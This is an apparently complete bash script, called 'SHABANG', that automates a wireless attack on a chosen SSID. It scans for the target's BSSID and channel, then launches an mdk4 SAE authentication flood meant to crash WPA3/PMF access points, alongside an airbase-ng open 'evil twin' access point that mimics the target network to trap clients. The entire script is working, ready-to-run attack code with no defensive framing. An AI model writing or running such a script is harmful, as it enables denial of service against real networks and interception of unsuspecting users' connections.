#!/bin/bash

# --- 1. Interface Selection ---
# Since we are using ONE card, we pick it once.
read -p "Enter Interface (e.g., wlan0mon): " IFACE
read -p "Enter Target SSID: " SSID

# --- 2. Automated Scanner Logic ---
# Logic: We must scan to find the BSSID and Channel automatically
echo "[*] Scanning for $SSID..."
rm -f /tmp/shabang-01.csv
# We use sudo and -hold so you can see if the scanner fails
xterm -geometry 100x24 -hold -e "sudo airodump-ng $IFACE --band g -w /tmp/shabang --output-format csv" &
SCAN_PID=$!

# Logic Gate: Wait for the file to be created by the hardware
while [ ! -f /tmp/shabang-01.csv ]; do
    sleep 1
done

echo "[*] Scanner active. Wait 10 seconds, then press ENTER to lock target."
read 
kill $SCAN_PID

# Parse target info
BSSID=$(grep "$SSID" /tmp/shabang-01.csv | awk -F, 'NR==1 {print $1}' | tr -d ' ')
CH=$(grep "$SSID" /tmp/shabang-01.csv | awk -F, 'NR==1 {print $4}' | tr -d ' ')

if [ -z "$BSSID" ]; then
    echo "[-] Error: SSID not found in scan. Check your card/signal."
    exit 1
fi

# --- 3. The Multi-Layer Attack ---
# Lock the card to the target channel to prevent 'Not Available' errors
sudo iw dev $IFACE set channel $CH

# [Window 1] The CPU Crusher (SAE Flood)
# mdk4 is the logical choice for crashing WPA3/PMF stacks
xterm -T "WPA3 SAE CRASH" -e "sudo mdk4 $IFACE a -a $BSSID -m -s 1000" &

# [Window 2] The Evil Twin (The Trap)
# Simplified command to avoid 'Option not available' errors.
# We skip '-z 2' and let it default to Open to maximize 'Roaming' logic.
xterm -T "EVIL TWIN" -e "sudo airbase-ng -e '$SSID' -c $CH $IFACE" &

# [Window 3] Monitor
xterm -T "MONITOR" -e "sudo airodump-ng --bssid $BSSID --channel $CH $IFACE" &

echo "[!] SHABANG ACTIVE. One card is now jamming and hosting."
